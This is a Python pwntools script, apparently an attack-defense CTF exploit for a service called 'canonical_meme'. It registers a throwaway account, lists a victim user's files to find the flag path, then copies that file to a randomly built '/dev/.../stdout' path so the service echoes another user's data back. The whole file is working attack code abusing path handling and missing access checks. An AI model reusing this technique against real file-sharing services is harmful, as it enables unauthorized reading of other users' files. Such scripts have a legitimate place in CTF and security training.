#!/usr/bin/env python3

import random
import sys

from checklib import *  # type: ignore
from pwn import context, log, remote

context.timeout = 10
context.log_level = 'INFO'

if len(sys.argv) != 3:
    print("Usage: python3 canonical_meme.py <ip> <attack_data>")
    sys.exit(1)

ip = sys.argv[1]
attack_data = sys.argv[2]

username1, username2 = (x.split('=')[1] for x in attack_data.split(":"))

log.info(f"attacking {username1} and {username2}")

with remote(ip, 13345) as r:
    r.recvuntil(b'quit')
    attacker_username, attacker_password = rnd_username(), rnd_password()
    log.info(f"attacker username: {
             attacker_username}, attacker password: {attacker_password}")

    r.sendline(f'register {attacker_username} {attacker_password}'.encode())
    r.recvuntil(b'Please login')
    r.sendline(f'login {attacker_username} {attacker_password}'.encode())
    r.recvuntil(b'Welcome, ')
    r.recvuntil(b'> ')

    r.sendline(f'list_files {username1}'.encode())
    r.recvuntil(b'Path: ')
    flag_path = r.recvline().decode().split(',')[0].strip()

    log.info(f"flag path: {flag_path}")

    # Generate random string of / and . without adjacent ..
    path_parts = []
    for _ in range(random.randint(20, 30)):
        if not path_parts or path_parts[-1] == '/':
            # After / we can use either . or /
            path_parts.append(random.choice(['/', '.']))
        else:
            # After . we must use /
            path_parts.append('/')

    path_gadget = ''.join(path_parts)
    path = f'/dev/{path_gadget}/stdout'
    log.info(f"path: {path}")

    r.sendline(f'copy {flag_path} {path}'.encode())
    data = r.recvuntil(b'File copied successfully')
    log.info(f"data: {data}")
